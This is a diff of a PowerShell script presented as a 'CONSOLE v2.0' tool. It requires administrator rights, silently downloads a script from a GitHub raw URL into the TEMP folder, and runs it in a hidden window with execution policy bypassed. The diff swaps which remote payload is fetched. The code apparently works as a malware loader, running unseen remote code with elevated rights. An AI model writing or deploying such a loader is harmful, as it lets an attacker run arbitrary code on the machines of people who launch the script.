@@ -5,8 +5,8 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 $Host.UI.RawUI.WindowTitle = " CONSOLE v2.0 |  Dimasik "
-$url = "https://github.com/sys1e/cmd/raw/refs/heads/main/ps1.ps1"
-$path = "$env:TEMP\ps1.ps1"
+$url = "https://github.com/sys1e/cmd/raw/refs/heads/main/123.ps1"
+$path = "$env:TEMP\123.ps1"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
